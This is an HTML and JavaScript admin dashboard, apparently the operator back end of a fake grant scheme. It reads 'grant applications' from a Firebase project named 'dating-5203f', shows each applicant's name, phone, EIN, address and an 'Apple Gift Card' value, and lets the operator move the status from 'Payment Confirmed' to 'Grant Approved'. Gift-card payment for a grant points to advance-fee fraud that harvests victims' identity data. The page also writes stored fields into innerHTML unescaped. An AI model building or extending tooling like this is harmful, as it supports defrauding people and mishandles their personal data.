<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Admin Panel â€“ Grant Applications</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f8f8f8; }
    h2 { color: #333; }
    .container { background: white; padding: 20px; max-width: 700px; margin: auto; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
    select, input, textarea { width: 100%; padding: 10px; margin: 10px 0; }
    .card { background: #f1f1f1; padding: 15px; border-radius: 6px; margin-bottom: 20px; }
    button { padding: 10px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Grant Admin Dashboard</h2>
    <label>Select a User:</label>
    <select id="userSelect" onchange="loadUserData()">
      <option value="">-- Select Applicant --</option>
    </select>

    <div id="userDetails" style="display:none;">
      <div class="card" id="appInfo"></div>

      <label>Update Application Status:</label>
      <select id="statusSelect">
        <option value="Awaiting Confirmation">Awaiting Confirmation</option>
        <option value="Payment Confirmed">Payment Confirmed</option>
        <option value="Application in Progress">Application in Progress</option>
        <option value="Application Completed">Application Completed</option>
        <option value="Grant Approved">Grant Approved</option>
      </select>

      <button onclick="updateStatus()">Update Status</button>
    </div>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCrYrzAfC6OjwVSsQbL8HmTLR51595sd6U",
      authDomain: "dating-5203f.firebaseapp.com",
      projectId: "dating-5203f",
      storageBucket: "dating-5203f.firebasestorage.app",
      messagingSenderId: "243111420136",
      appId: "1:243111420136:web:60cc69e6ea7474309d695d"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const userSelect = document.getElementById('userSelect');
    const userDetails = document.getElementById('userDetails');
    const appInfo = document.getElementById('appInfo');
    const statusSelect = document.getElementById('statusSelect');

    const users = {};

    // Populate dropdown
    db.ref("grantApplications").once("value", (snapshot) => {
      snapshot.forEach(child => {
        const userId = child.key;
        const data = child.val();
        users[userId] = data;

        const option = document.createElement("option");
        option.value = userId;
        option.textContent = data.name + " - " + data.email;
        userSelect.appendChild(option);
      });
    });

    function loadUserData() {
      const uid = userSelect.value;
      if (!uid) return userDetails.style.display = "none";

      const data = users[uid];
      appInfo.innerHTML = `
        <strong>Name:</strong> ${data.name}<br>
        <strong>Email:</strong> ${data.email}<br>
        <strong>Phone:</strong> ${data.phone}<br>
        <strong>Business:</strong> ${data.businessName}<br>
        <strong>EIN:</strong> ${data.ein}<br>
        <strong>Address:</strong> ${data.address}<br>
        <strong>Gift Card:</strong> ${data.appleGiftCard}<br>
        <strong>Current Status:</strong> <em>${data.status}</em><br>
        <strong>Submitted:</strong> ${new Date(data.timestamp).toLocaleString()}
      `;

      statusSelect.value = data.status;
      userDetails.style.display = "block";
    }

    function updateStatus() {
      const uid = userSelect.value;
      const newStatus = statusSelect.value;
      if (!uid || !newStatus) return alert("Select a user and status.");

      db.ref("grantApplications/" + uid).update({
        status: newStatus
      }).then(() => {
        alert("Status updated!");
        users[uid].status = newStatus;
        loadUserData(); // Refresh UI
      }).catch(err => alert("Error: " + err.message));
    }
  </script>
</body>
</html>
